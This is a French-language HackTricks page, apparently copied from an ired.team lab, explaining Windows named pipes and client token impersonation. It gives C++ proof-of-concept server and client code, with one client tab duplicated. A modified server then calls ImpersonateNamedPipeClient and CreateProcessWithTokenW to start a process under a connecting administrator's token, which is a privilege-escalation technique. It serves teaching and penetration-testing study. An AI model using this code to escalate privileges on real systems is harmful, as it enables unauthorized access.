# Impersonation de client de canal nommé

## Impersonation de client de canal nommé

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Ces informations ont été copiées depuis** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)

## Aperçu

Un `canal` est un bloc de mémoire partagée que les processus peuvent utiliser pour la communication et l'échange de données.

Les `canaux nommés` sont un mécanisme Windows qui permet à deux processus non liés d'échanger des données entre eux, même si les processus sont situés sur deux réseaux différents. C'est très similaire à l'architecture client/serveur car des notions telles que `un serveur de canal nommé` et un `client de canal nommé` existent.

Un serveur de canal nommé peut ouvrir un canal nommé avec un nom prédéfini, puis un client de canal nommé peut se connecter à ce canal via le nom connu. Une fois la connexion établie, l'échange de données peut commencer.

Ce laboratoire concerne un code PoC simple qui permet :

* de créer un serveur de canal nommé stupide à un seul thread qui acceptera une connexion client
* au serveur de canal nommé d'écrire un message simple dans le canal nommé afin que le client de canal puisse le lire

## Code

Ci-dessous se trouve le PoC pour le serveur et le client : 

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	return 0;
}
```
{% endtab %}

{% tab title="namedPipeClient.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <tchar.h>

#define BUFSIZE 512

int _tmain(int argc, TCHAR *argv[])
{
   HANDLE hPipe;
   LPTSTR lpvMessage=TEXT("Default message from client.");
   TCHAR chBuf[BUFSIZE];
   BOOL fSuccess = FALSE;
   DWORD cbRead, cbToWrite, cbWritten, dwMode;
   LPTSTR lpszPipename = TEXT("\\\\.\\pipe\\mynamedpipe");

   if( argc > 1 )
      lpvMessage = argv[1];

   // Try to open a named pipe; wait for it, if necessary.

   while (1)
   {
      hPipe = CreateFile(
         lpszPipename,   // pipe name
         GENERIC_READ |  // read and write access
         GENERIC_WRITE,
         0,              // no sharing
         NULL,           // default security attributes
         OPEN_EXISTING,  // opens existing pipe
         0,              // default attributes
         NULL);          // no template file

      // Break if the pipe handle is valid.

      if (hPipe != INVALID_HANDLE_VALUE)
         break;

      // Exit if an error other than ERROR_PIPE_BUSY occurs.

      if (GetLastError() != ERROR_PIPE_BUSY)
      {
         _tprintf( TEXT("Could not open pipe. GLE=%d\n"), GetLastError() );
         return -1;
      }

      // All pipe instances are busy, so wait for 20 seconds.

      if ( ! WaitNamedPipe(lpszPipename, 20000))
      {
         printf("Could not open pipe: 20 second wait timed out.");
         return -1;
      }
   }

   // The pipe connected; change to message-read mode.

   dwMode = PIPE_READMODE_MESSAGE;
   fSuccess = SetNamedPipeHandleState(
      hPipe,    // pipe handle
      &dwMode,  // new pipe mode
      NULL,     // don't set maximum bytes
      NULL);    // don't set maximum time

   if ( ! fSuccess)
   {
      _tprintf( TEXT("SetNamedPipeHandleState failed. GLE=%d\n"), GetLastError() );
      return -1;
   }

   // Send a message to the pipe server.

   cbToWrite = (lstrlen(lpvMessage)+1)*sizeof(TCHAR);
   _tprintf( TEXT("Sending %d byte message: \"%s\"\n"), cbToWrite, lpvMessage);

   fSuccess = WriteFile(
      hPipe,                  // pipe handle
      lpvMessage,             // message
      cbToWrite,              // message length
      &cbWritten,             // bytes written
      NULL);                  // not overlapped

   if ( ! fSuccess)
   {
      _tprintf( TEXT("WriteFile to pipe failed. GLE=%d\n"), GetLastError() );
      return -1;
   }

   printf("\nMessage sent to server, receiving reply as follows:\n");

   do
   {
      // Read from the pipe.

      fSuccess = ReadFile(
         hPipe,    // pipe handle
         chBuf,    // buffer to receive reply
         BUFSIZE*sizeof(TCHAR),  // size of buffer
         &cbRead,  // number of bytes read
         NULL);    // not overlapped

      if ( ! fSuccess && GetLastError() != ERROR_MORE_DATA )
         break;

      _tprintf( TEXT("\"%s\"\n"), chBuf );
   } while ( ! fSuccess);  // repeat loop if ERROR_MORE_DATA

   if ( ! fSuccess)
   {
      _tprintf( TEXT("ReadFile from pipe failed. GLE=%d\n"), GetLastError() );
      return -1;
   }

   _tprintf( TEXT("\n<End of message, press ENTER to terminate connection and exit>") );
   _getch();

   CloseHandle(hPipe);

   return 0;
}
```

{% endtab %}

{% tab title="namedPipeClient.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <tchar.h>

#define BUFSIZE 512

int _tmain(int argc, TCHAR *argv[])
{
   HANDLE hPipe;
   LPTSTR lpvMessage=TEXT("Message par défaut du client.");
   TCHAR chBuf[BUFSIZE];
   BOOL fSuccess = FALSE;
   DWORD cbRead, cbToWrite, cbWritten, dwMode;
   LPTSTR lpszPipename = TEXT("\\\\.\\pipe\\mynamedpipe");

   if( argc > 1 )
      lpvMessage = argv[1];

   // Essayez d'ouvrir un pipe nommé ; attendez-le, si nécessaire.

   while (1)
   {
      hPipe = CreateFile(
         lpszPipename,   // nom du pipe
         GENERIC_READ |  // accès en lecture et écriture
         GENERIC_WRITE,
         0,              // pas de partage
         NULL,           // attributs de sécurité par défaut
         OPEN_EXISTING,  // ouvre le pipe existant
         0,              // attributs par défaut
         NULL);          // pas de fichier modèle

      // Arrêtez si la poignée de pipe est valide.

      if (hPipe != INVALID_HANDLE_VALUE)
         break;

      // Quittez si une erreur autre que ERROR_PIPE_BUSY se produit.

      if (GetLastError() != ERROR_PIPE_BUSY)
      {
         _tprintf( TEXT("Impossible d'ouvrir le pipe. GLE=%d\n"), GetLastError() );
         return -1;
      }

      // Toutes les instances de pipe sont occupées, attendez donc 20 secondes.

      if ( ! WaitNamedPipe(lpszPipename, 20000))
      {
         printf("Impossible d'ouvrir le pipe : délai d'attente de 20 secondes expiré.");
         return -1;
      }
   }

   // Le pipe est connecté ; passez en mode de lecture de message.

   dwMode = PIPE_READMODE_MESSAGE;
   fSuccess = SetNamedPipeHandleState(
      hPipe,    // poignée de pipe
      &dwMode,  // nouveau mode de pipe
      NULL,     // ne pas définir le nombre maximal d'octets
      NULL);    // ne pas définir le temps maximal

   if ( ! fSuccess)
   {
      _tprintf( TEXT("SetNamedPipeHandleState a échoué. GLE=%d\n"), GetLastError() );
      return -1;
   }

   // Envoyer un message au serveur de pipe.

   cbToWrite = (lstrlen(lpvMessage)+1)*sizeof(TCHAR);
   _tprintf( TEXT("Envoi d'un message de %d octets : \"%s\"\n"), cbToWrite, lpvMessage);

   fSuccess = WriteFile(
      hPipe,                  // poignée de pipe
      lpvMessage,             // message
      cbToWrite,              // longueur du message
      &cbWritten,             // octets écrits
      NULL);                  // pas de chevauchement

   if ( ! fSuccess)
   {
      _tprintf( TEXT("WriteFile vers le pipe a échoué. GLE=%d\n"), GetLastError() );
      return -1;
   }

   printf("\nMessage envoyé au serveur, réception de la réponse comme suit :\n");

   do
   {
      // Lire depuis le pipe.

      fSuccess = ReadFile(
         hPipe,    // poignée de pipe
         chBuf,    // tampon pour recevoir la réponse
         BUFSIZE*sizeof(TCHAR),  // taille du tampon
         &cbRead,  // nombre d'octets lus
         NULL);    // pas de chevauchement

      if ( ! fSuccess && GetLastError() != ERROR_MORE_DATA )
         break;

      _tprintf( TEXT("\"%s\"\n"), chBuf );
   } while ( ! fSuccess);  // répéter la boucle si ERROR_MORE_DATA

   if ( ! fSuccess)
   {
      _tprintf( TEXT("ReadFile depuis le pipe a échoué. GLE=%d\n"), GetLastError() );
      return -1;
   }

   _tprintf( TEXT("\n<Fin du message, appuyez sur ENTRÉE pour terminer la connexion et quitter>") );
   _getch();

   CloseHandle(hPipe);

   return 0;
}
```

{% endtab %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
	LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
	HANDLE clientPipe = NULL;
	BOOL isPipeRead = true;
	wchar_t message[MESSAGE_SIZE] = { 0 };
	DWORD bytesRead = 0;

	std::wcout << "Connecting to " << pipeName << std::endl;
	clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	
	while (isPipeRead) {
		isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
		std::wcout << "Received message: " << message;
	}

	return 0;
}
```
{% endtab %}
{% endtabs %}

## Exécution

Ci-dessous, le serveur de canalisation nommé et le client de canalisation nommé fonctionnent comme prévu:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

Il convient de noter que la communication de canalisation nommée utilise par défaut le protocole SMB:

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

Vérification de la manière dont le processus maintient une poignée sur notre canalisation nommée `mantvydas-first-pipe`:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

De même, nous pouvons voir que le client a une poignée ouverte sur la canalisation nommée:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

Nous pouvons même voir notre canalisation avec powershell:
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (3).png>)

## Impersonation de jeton

{% hint style="info" %}
Notez que pour pouvoir usurper le jeton du processus client, vous devez avoir (le processus serveur créant le pipe) le privilège de jeton **`SeImpersonate`**
{% endhint %}

Il est possible pour le serveur de pipe nommé d'usurper le contexte de sécurité du client de pipe nommé en utilisant un appel d'API `ImpersonateNamedPipeClient` qui à son tour change le jeton du thread actuel du serveur de pipe nommé avec celui du jeton du client de pipe nommé.

Nous pouvons mettre à jour le code du serveur de pipe nommé comme ceci pour réaliser l'usurpation - notez que les modifications sont visibles à la ligne 25 et en dessous :
```cpp
int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	std::wcout << "Impersonating the client..." << std::endl;
	ImpersonateNamedPipeClient(serverPipe);
	err = GetLastError();	

	STARTUPINFO	si = {};
	wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
	PROCESS_INFORMATION pi = {};
	HANDLE threadToken = GetCurrentThreadToken();
	CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	return 0;
}
```
En exécutant le serveur et en se connectant à celui-ci avec le client qui s'exécute sous le contexte de sécurité administrator@offense.local, nous pouvons voir que le thread principal du serveur de canalisation nommé a assumé le jeton du client de canalisation nommé - offense\administrator, bien que PipeServer.exe lui-même s'exécute sous le contexte de sécurité ws01\mantvydas. Cela semble être une bonne façon d'escalader les privilèges ?
